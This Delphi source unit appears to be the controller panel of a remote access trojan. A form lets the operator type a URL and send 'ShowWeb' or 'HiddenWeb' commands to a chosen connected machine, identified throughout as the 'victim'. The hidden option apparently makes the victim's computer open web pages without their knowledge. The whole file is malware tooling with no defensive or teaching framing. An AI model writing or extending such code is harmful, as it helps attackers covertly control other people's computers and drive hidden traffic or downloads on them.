unit FrmVisitWeb;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.WinXCtrls;

type
  TForm6 = class(TForm)
    ToggleSwitch1: TToggleSwitch;
    Edit1: TEdit;
    Button1: TButton;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
 ThisFormsVictimID: string;
  end;

var
  Form6: TForm6;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm6.Button1Click(Sender: TObject);
begin
  if ToggleSwitch1.State = tssOff then
  begin
       SendToSelectedClient(ThisFormsVictimID, 'ShowWeb|' + edit1.text);
  end
  else if ToggleSwitch1.State = tssOn then
  begin
       SendToSelectedClient(ThisFormsVictimID, 'HiddenWeb|' + edit1.text);
  end;

end;

end.
